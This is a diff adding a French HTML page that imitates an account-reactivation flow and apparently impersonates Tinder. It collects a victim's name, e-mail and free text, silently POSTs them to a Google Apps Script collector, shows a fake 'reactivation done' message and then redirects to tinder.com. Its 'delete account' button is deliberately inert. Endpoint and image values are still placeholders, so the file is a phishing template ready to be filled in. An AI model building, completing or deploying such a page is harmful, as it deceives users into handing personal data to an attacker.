@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<!-- saved from url=(0045)file:///C:/Users/Marians/Downloads/Index.html -->
+<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>Réactivation</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background-color: #000;
+      overflow: hidden;
+    }
+
+    .page {
+      position: fixed;
+      inset: 0;
+      display: none;
+      width: 100%;
+      height: 100%;
+    }
+    .page.active {
+      display: block;
+    }
+
+    /* Fond plein écran */
+    .fullscreen-img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    /* Pages 2, 3, 4 : même fond image */
+    .page-with-bg {
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      position: fixed;
+      inset: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      box-sizing: border-box;
+      color: #fff;
+      text-align: center;
+    }
+
+    .content-box {
+      width: 100%;
+      max-width: 420px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .button-row {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px 18px;
+      border-radius: 999px;
+      border: 1px solid #fff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .btn-delete {
+      background-color: #000;
+      color: #fff;
+      border-color: #000;
+      opacity: 0.9;
+    }
+
+    .btn-reactivate {
+      background-color: transparent;
+      color: #fff;
+      backdrop-filter: blur(6px);
+      background: rgba(0,0,0,0.25);
+    }
+
+    .btn-reactivate-solid {
+      background-color: #ffffff;
+      color: #000;
+      border-color: #ffffff;
+    }
+
+    .fields {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .fields input,
+    .fields textarea {
+      width: 100%;
+      border-radius: 8px;
+      border: none;
+      padding: 10px 12px;
+      font-size: 14px;
+      box-sizing: border-box;
+      outline: none;
+    }
+
+    .fields textarea {
+      min-height: 70px;
+      resize: vertical;
+    }
+
+    .helper-text {
+      font-size: 13px;
+      opacity: 0.8;
+    }
+
+    .status-text {
+      font-size: 22px;
+      font-weight: 700;
+      text-shadow: 0 0 10px rgba(0,0,0,0.6);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- PAGE 1 : GIF plein écran -->
+  <div id="page1" class="page">
+    <img class="fullscreen-img" src="./Réactivation_files/Page d&#39;accueil mobile.png" alt="Intro">
+  </div>
+
+  <!-- PAGE 2 : fond + 2 boutons -->
+  <div id="page2" class="page active">
+    <div class="page-with-bg" src="C:\Users\Marians\Documents\Izmest\Page principale.png">
+      <div class="content-box">
+        <div class="helper-text">
+          <!-- 🔵 Texte explicatif facultatif -->
+          Choisissez une option pour continuer.
+        </div>
+        <div class="button-row">
+          <button class="btn-delete" type="button">
+            Supprimer mon compte
+          </button>
+          <button class="btn-reactivate" type="button" id="btnToPage3">
+            Réactiver mon compte
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 3 : fond + 3 champs + bouton -->
+  <div id="page3" class="page">
+    <div class="page-with-bg" style="background-image: url(&#39;🔵 VOTRE_URL_IMAGE_DE_FOND_PAGES_2_3_4_ICI&#39;);">
+      <div class="content-box">
+        <div class="helper-text">
+          🔵 Merci de compléter les champs ci-dessous pour la réactivation.
+        </div>
+        <div class="fields">
+          <!-- 🔵 Ici, tu peux préciser le type d’info attendue dans chaque champ via placeholder -->
+          <input id="field1" type="text" placeholder="🔵 Premier champ (par ex. : Votre nom)" required="">
+          <input id="field2" type="text" placeholder="🔵 Deuxième champ (par ex. : Votre e-mail)" required="">
+          <textarea id="field3" placeholder="🔵 Troisième champ (par ex. : Expliquez votre demande)" required=""></textarea>
+        </div>
+        <button class="btn-reactivate-solid" type="button" id="btnSubmit">
+          Réactiver mon compte
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 4 : confirmation -->
+  <div id="page4" class="page">
+    <div class="page-with-bg" style="background-image: url(&#39;🔵 VOTRE_URL_IMAGE_DE_FOND_PAGES_2_3_4_ICI&#39;);">
+      <div class="content-box" style="align-items:center;">
+        <div class="status-text">
+          Réactivation effectuée
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // 🔵 À REMPLACER PAR L’URL DE TON WEB APP GOOGLE APPS SCRIPT
+    const SCRIPT_URL = "🔵 VOTRE_URL_WEB_APP_APPS_SCRIPT_ICI";
+
+    function showPage(id) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+
+      // Petit “truc” pour réduire la barre d’adresse sur mobile
+      setTimeout(() => {
+        window.scrollTo(0, 1);
+      }, 50);
+    }
+
+    // Splash screen : 1,5 s puis page 2
+    window.addEventListener('load', () => {
+      setTimeout(() => {
+        showPage('page2');
+      }, 1500);
+    });
+
+    // Bouton "Réactiver mon compte" sur la page 2
+    document.getElementById('btnToPage3').addEventListener('click', () => {
+      showPage('page3');
+    });
+
+    // Bouton "Réactiver mon compte" sur la page 3 (envoi vers Google Sheets)
+    document.getElementById('btnSubmit').addEventListener('click', async () => {
+      const field1 = document.getElementById('field1').value.trim();
+      const field2 = document.getElementById('field2').value.trim();
+      const field3 = document.getElementById('field3').value.trim();
+
+      if (!field1 || !field2 || !field3) {
+        alert("Merci de remplir tous les champs.");
+        return;
+      }
+
+      try {
+        // Envoi au script Google Apps Script
+        await fetch(SCRIPT_URL, {
+          method: "POST",
+          mode: "no-cors", // pour éviter certains problèmes CORS
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            a1: field1,
+            b1: field2,
+            c1: field3
+          })
+        });
+      } catch (e) {
+        // Tu peux afficher une erreur si tu veux
+        console.error("Erreur d’envoi vers Google Apps Script", e);
+      }
+
+      // Affichage de la page 4 (confirmation)
+      showPage('page4');
+
+      // Après 3 secondes, redirection vers Tinder
+      setTimeout(() => {
+        window.location.href = "https://tinder.com/";
+      }, 3000);
+    });
+
+    // Le bouton "Supprimer mon compte" NE FAIT RIEN, comme demandé
+  </script>
+
+
+</body></html>
